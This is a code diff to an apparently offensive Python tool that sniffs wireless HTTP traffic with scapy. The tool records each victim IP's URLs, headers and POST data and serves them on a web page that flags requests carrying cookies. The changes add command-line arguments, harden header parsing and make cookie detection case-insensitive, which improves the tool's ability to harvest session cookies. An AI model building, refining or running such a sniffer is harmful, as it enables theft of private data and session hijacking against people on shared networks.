@@ -12,8 +12,8 @@ import scapy_http.http as http
 from collections import defaultdict
 
 host = '0.0.0.0'
-port = int(sys.argv[1])
-server_ip = '192.168.1.103'
+server_ip = sys.argv[1]
+port = int(sys.argv[2])
 iface = 'mon0'
 
 httphead = 'HTTP/1.1 200 ok\r\n\r\n'
@@ -29,7 +29,7 @@ def prn(pkt):
     if not pkt.haslayer(http.HTTPRequest):return None
     print pkt.summary()
     url = 'http://'+pkt.Host+pkt.Path
-    headers = {i.split(": ")[0]:i.split(": ")[1] for i in pkt.Headers.split("\r\n")}
+    headers = {i.split(": ")[0]:i.split(": ")[1] for i in pkt.Headers.split("\r\n") if ': ' in i}
     data = pkt.load if pkt.Method=='POST' else 'None'
     #html += '<a href="%s">%s<a><br>\n'%(url,url)
     ip_dict[pkt[IP].src][url] = (pkt.Method, headers, data)
@@ -66,7 +66,7 @@ while True:
             conn.close()
         elif req_body.Path[1:] in ip_dict.keys():
             ip = req_body.Path[1:]
-            html = '</br>\n'.join(['<a href="{0}/{1}" style="color:{2}">{3}====>{4}<a>'.format(ip, url.encode('base64'), '#FF3811' if 'Cookie' in value[1].keys() else '#4590F9', value[0],  url[:100]) for url,value in ip_dict[ip].items()])
+            html = '</br>\n'.join(['<a href="{0}/{1}" style="color:{2}">{3}====>{4}<a>'.format(ip, url.encode('base64'), '#FF3811' if 'cookie' in [i.lower() for i in value[1].keys()] else '#4590F9', value[0],  url[:100]) for url,value in ip_dict[ip].items()])
             conn.send(httphead+html)
             conn.close()
         else:
